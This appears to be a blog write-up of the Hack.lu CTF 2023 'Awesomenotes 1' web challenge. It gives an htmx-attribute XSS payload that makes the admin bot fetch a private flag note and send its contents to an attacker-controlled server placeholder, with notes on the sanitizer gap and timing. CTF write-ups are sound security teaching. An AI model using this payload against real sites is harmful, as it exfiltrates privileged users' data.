---
layout: post
title: "Hack.lu CTF - "Awesomenotes 1" web challenge writeup"
date: 2023-10-15 22:40:00 +0100
categories: ctf web security writeup htmx
permalink: /posts/ctf-hack-lu-awesomenotes
---

## Awesomenotes 1

CTF name: **[Hack.lu CTF 2023](https://flu.xxx/info)**
Challenge name: **Awesomenotes 1**
Challenge description:

```text
We're excited to announce our new, revolutionary product: A note-taking app. This phenomenal product uses the most up-to-date, bleeding-edge tech in order to stay ahead of all potential security issues. No-one can pwn us.
```

Challenge category: **web**
Challenge points: **88**
When: **Fri, Oct. 13, 18:00 — Sun, Oct. 15, 18:00 UTC**

### TLDR - solution

```html
<div 
    hx-get="/api/note/flag?t=" 
    hx-trigger="load delay:0.001s"
    hx-target="#report"
>
    get flag
</div>
<div 
    hx-get="YOUR_SERVER" 
    hx-on::config-request="event.detail.parameters['flag'] = document.getElementById('report').innerHTML"
    hx-trigger="load delay:0.8s"
    hx-target="#report"
>
    send flag
</div>
```

### Description

![Alt text](/assets/images/2023-10-15/image-4.png)
Challenge was marked as **beginner friendly**. You're greet with a simple web page where you can create and report a `note`.

![Alt text](/assets/images/2023-10-15/image-8.png)

After checking the `get_note` function we knew the flag location (in a `flag` note) and that only admin had an access to it.

![Alt text](/assets/images/2023-10-15/image-1.png)

Another function `take_report` is called by a bot after reporting a note. The last function `upload_note` has some logic to sanitize a user input. After a quick look you find that `hx-` tags are allowed.

![Alt text](/assets/images/2023-10-15/image-2.png)

Another hint is in the `note.html` file.

![Alt text](/assets/images/2023-10-15/image-3.png)

It should be clear by now that we need to prepare a note and use **XSS** to send us a flag after we report it to admin and that [htmx](https://htmx.org/docs/) is used/allowed on the FE. There's even an example 😉

We used [webhook.site](https://webhook.site) as a temporary log server.

The idea was to use `htmx` to make two calls:

- first to get the `flag` note from `/api/notes/flag`
- second to send the `flag` to our server

`noteId` is always added to `hx-get="/api/note/` on every `post` call, so adding `?t=` at the very end means we can ignore it. `hx-trigger` sets the runtime delay. `hx-target` is our target html element, so we used the `report` bottom link button with `id="report"`.

![Alt text](/assets/images/2023-10-15/image-5.png)

We've got the first call ready (it fails with `401` while testing. It's a good sign because we don't have an access to the flag).

The second part is all about `hx-on::config-request`. In the [docs](https://htmx.org/events/#htmx:configRequest) we've found you can set event parameters via `event.detail.parameters['your_parameter']`. We should already have the `flag` in `#report` link, so all we need is to get the value via `document.getElementById('report').innerHTML`. Last thing is to set the trigger to give some time for the first call to update the link.

Send prepared note, wait for a request

![Alt text](/assets/images/2023-10-15/image-7.png)

and you get the `flag`

```text
flag{C3r34l_1s_s0up_l1k3_1f_4gr33}
```

{% include posts_footer.html %}
